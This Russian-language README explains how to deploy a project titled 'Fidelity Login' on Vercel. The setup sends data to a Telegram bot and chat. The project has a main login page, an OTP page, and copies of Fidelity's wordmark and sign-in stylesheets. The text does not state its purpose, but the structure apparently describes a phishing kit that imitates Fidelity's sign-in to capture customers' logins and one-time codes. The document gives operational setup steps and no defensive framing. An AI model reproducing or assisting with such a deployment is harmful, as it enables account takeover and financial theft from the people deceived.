# Fidelity Login - Vercel Deployment

## Настройка для деплоя на Vercel

### 1. Подготовка
1. Зарегистрируйтесь на [vercel.com](https://vercel.com)
2. Установите Vercel CLI: `npm i -g vercel`
3. Или используйте GitHub интеграцию

### 2. Настройка Telegram Bot
1. Создайте бота через [@BotFather](https://t.me/BotFather)
2. Получите токен бота
3. Создайте группу/канал и добавьте бота
4. Получите chat ID (используйте @userinfobot или API)

### 3. Конфигурация
Отредактируйте `config.php`:
```php
<?php
$botToken = 'ВАШ_ТОКЕН_БОТА';
$chatId = 'ВАШ_CHAT_ID';
?>
```

### 4. Деплой

#### Через CLI:
```bash
vercel login
vercel
```

#### Через GitHub:
1. Загрузите файлы в репозиторий GitHub
2. Подключите репозиторий на Vercel
3. Vercel автоматически определит настройки из `vercel.json`

### 5. Структура проекта
```
fidel/
├── index.php          # Главная страница
├── otp.php            # Страница OTP
├── config.php         # Конфигурация бота
├── vercel.json        # Конфигурация Vercel
├── .vercelignore      # Исключения
└── assets/            # CSS, шрифты, логотип
    ├── common-logincss.css
    ├── dom-signin.css
    ├── fonts.css
    └── Fidelity-wordmark.svg
```

### Особенности
- PHP 8.1 runtime
- Serverless функции
- Сессии работают корректно
- Все роуты настроены
